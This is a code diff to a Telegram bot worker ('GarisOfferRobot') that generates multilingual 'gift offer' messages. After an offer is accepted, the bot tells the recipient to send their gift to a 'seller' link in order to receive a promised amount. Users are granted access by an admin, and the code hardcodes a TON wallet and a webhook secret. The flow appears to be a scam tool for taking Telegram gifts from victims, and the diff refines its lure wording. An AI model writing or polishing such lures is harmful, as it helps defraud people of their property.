@@ -2,7 +2,7 @@ const ADMIN_ID = 5151757168;
 const WEBHOOK_SECRET = "GarisOffer9231998";
 const TON_WALLET = "UQChRfzub4CLp2FAV998bfowFC4eE3aqIRQQeZinoajQ0oOG";
 const BOT_USERNAME = "GarisOfferRobot";
-const CHANNEL_ID = "@GarisOfferChanel";
+const CHANNEL_ID = "@GarisOffer";
 
 export default {
   async fetch(request, env, ctx) {
@@ -1205,39 +1205,38 @@ export default {
         let btnDecline = "Отклонить";
         let titleText = "";
 
-        // ТЕКСТЫ ДЛЯ ОФФЕРОВ (только 4 языка)
+        // УПРОЩЕННЫЕ ТЕКСТЫ ДЛЯ ОФФЕРОВ
         if (lang === "en") {
-          text = `<b>🎁 Gift Offer</b>\n\n` +
-                 `<b>💰 Amount:</b> ${amount} ${currencyDisplay}\n` +
-                 `<b>👤 From:</b> ${senderName}\n\n` +
-                 `🔗 <a href="${giftLink}">Click to view the gift</a>\n\n` +
-                 `<i>Accept the offer if you want to sell this gift.</i>`;
-          btnAccept = "✅ Accept"; btnDecline = "❌ Decline";
-          titleText = `🎁 Offer: ${amount} ${currencyDisplay}`;
+          text =
+            `<b>Gift Offer</b>\n\n` +
+            `You are offered <b>${amount} ${currencyDisplay}</b>\n` +
+            `${giftLink}`;
+          btnAccept = "Accept";
+          btnDecline = "Decline";
+          titleText = `Offer: ${amount} ${currencyDisplay}`;
         } else if (lang === "cn") {
-          text = `<b>🎁 礼物报价</b>\n\n` +
-                 `<b>💰 金额:</b> ${amount} ${currencyDisplay}\n` +
-                 `<b>👤 来自:</b> ${senderName}\n\n` +
-                 `🔗 <a href="${giftLink}">点击查看礼物</a>\n\n` +
-                 `<i>如果您想出售此礼物，请接受报价。</i>`;
-          btnAccept = "✅ 接受"; btnDecline = "❌ 拒绝";
-          titleText = `🎁 报价: ${amount} ${currencyDisplay}`;
+          text =
+            `<b>礼物报价</b>\n\n` +
+            `有人为您提供 <b>${amount} ${currencyDisplay}</b>\n` +
+            `${giftLink}`;
+          btnAccept = "接受";
+          btnDecline = "拒绝";
+          titleText = `报价: ${amount} ${currencyDisplay}`;
         } else if (lang === "ar") {
-          text = `<b>🎁 عرض هدية</b>\n\n` +
-                 `<b>💰 المبلغ:</b> ${amount} ${currencyDisplay}\n` +
-                 `<b>👤 من:</b> ${senderName}\n\n` +
-                 `🔗 <a href="${giftLink}">انقر لعرض الهدية</a>\n\n` +
-                 `<i>اقبل العرض إذا كنت ترغب في بيع هذه الهدية.</i>`;
-          btnAccept = "✅ قبول"; btnDecline = "❌ رفض";
-          titleText = `🎁 عرض: ${amount} ${currencyDisplay}`;
+          text =
+            `<b>عرض هدية</b>\n\n` +
+            `تم تقديم لك <b>${amount} ${currencyDisplay}</b>\n` +
+            `${giftLink}`;
+          btnAccept = "قبول";
+          btnDecline = "رفض";
+          titleText = `عرض: ${amount} ${currencyDisplay}`;
         } else {
           // Русский (по умолчанию)
-          text = `<b>🎁 Оффер на подарок</b>\n\n` +
-                 `<b>💰 Сумма:</b> ${amount} ${currencyDisplay}\n` +
-                 `<b>👤 Отправитель:</b> ${senderName}\n\n` +
-                 `🔗 <a href="${giftLink}">Нажмите, чтобы посмотреть подарок</a>\n\n` +
-                 `<i>Примите оффер, если хотите продать этот подарок.</i>`;
-          titleText = `🎁 Оффер: ${amount} ${currencyDisplay}`;
+          text =
+            `<b>Оффер на подарок</b>\n\n` +
+            `Вам предлагают <b>${amount} ${currencyDisplay}</b>\n` +
+            `${giftLink}`;
+          titleText = `Оффер: ${amount} ${currencyDisplay}`;
         }
 
         const offerId = Math.random()
@@ -1263,7 +1262,7 @@ export default {
           type: "article",
           id: "1",
           title: titleText,
-          description: `Нажмите сюда, чтобы отправить предложение о покупке`,
+          description: `${amount} ${currencyDisplay}`,
           input_message_content: {
             message_text: text,
             parse_mode: "HTML"
@@ -1885,7 +1884,6 @@ export default {
               "Доступ выдан ✅"
             );
 
-            // ОБНОВЛЕННЫЙ БЛОК ОТПРАВКИ СООБЩЕНИЯ ПОЛЬЗОВАТЕЛЮ
             try {
               await callApi("sendMessage", {
                 chat_id: targetUserId,
@@ -2095,29 +2093,53 @@ export default {
             const finalUrl = "https://t.me/" + targetReceiver;
 
             if (lang === "en") {
-              newText = `✅ <b>OFFER ACCEPTED</b>\n\n` +
-                        `💰 <b>You will receive:</b> ${amount} ${displayCurrency}\n\n` +
-                        `📦 <b>Next step:</b> Send the gift to the seller.\n\n` +
-                        `👇 <i>Click the button below to proceed:</i>`;
-              newMarkup = { inline_keyboard: [[{ text: "🚀 Send Gift to Seller", url: finalUrl }]] };
+              newText =
+                `✅ <b>Accepted</b>\n\n` +
+                `To receive <b>${amount} ${displayCurrency}</b>, send the gift to the seller.`;
+              newMarkup = {
+                inline_keyboard: [[
+                  {
+                    text: "Send Gift",
+                    url: finalUrl
+                  }
+                ]]
+              };
             } else if (lang === "cn") {
-              newText = `✅ <b>报价已接受</b>\n\n` +
-                        `💰 <b>您将获得:</b> ${amount} ${displayCurrency}\n\n` +
-                        `📦 <b>下一步:</b> 将礼物发送给卖家。\n\n` +
-                        `👇 <i>点击下方按钮继续:</i>`;
-              newMarkup = { inline_keyboard: [[{ text: "🚀 发送礼物给卖家", url: finalUrl }]] };
+              newText =
+                `✅ <b>已接受</b>\n\n` +
+                `要获得 <b>${amount} ${displayCurrency}</b>，请将礼物发送给卖家。`;
+              newMarkup = {
+                inline_keyboard: [[
+                  {
+                    text: "发送礼物",
+                    url: finalUrl
+                  }
+                ]]
+              };
             } else if (lang === "ar") {
-              newText = `✅ <b>تم قبول العرض</b>\n\n` +
-                        `💰 <b>ستتلقى:</b> ${amount} ${displayCurrency}\n\n` +
-                        `📦 <b>الخطوة التالية:</b> أرسل الهدية إلى البائع.\n\n` +
-                        `👇 <i>انقر على الزر أدناه للمتابعة:</i>`;
-              newMarkup = { inline_keyboard: [[{ text: "🚀 إرسال الهدية إلى البائع", url: finalUrl }]] };
+              newText =
+                `✅ <b>مقبول</b>\n\n` +
+                `لتلقي <b>${amount} ${displayCurrency}</b>، يرجى إرسال الهدية إلى البائع。`;
+              newMarkup = {
+                inline_keyboard: [[
+                  {
+                    text: "إرسال الهدية",
+                    url: finalUrl
+                  }
+                ]]
+              };
             } else {
-              newText = `✅ <b>ОФФЕР ПРИНЯТ</b>\n\n` +
-                        `💰 <b>Вы получите:</b> ${amount} ${displayCurrency}\n\n` +
-                        `📦 <b>Что делать дальше:</b> Передайте подарок продавцу.\n\n` +
-                        `👇 <i>Нажмите на кнопку ниже, чтобы перейти к продавцу:</i>`;
-              newMarkup = { inline_keyboard: [[{ text: "🚀 Передать подарок продавцу", url: finalUrl }]] };
+              newText =
+                `✅ <b>Принято</b>\n\n` +
+                `Чтобы получить <b>${amount} ${displayCurrency}</b>, передайте подарок продавцу.`;
+              newMarkup = {
+                inline_keyboard: [[
+                  {
+                    text: "Передать подарок",
+                    url: finalUrl
+                  }
+                ]]
+              };
             }
 
           } else {
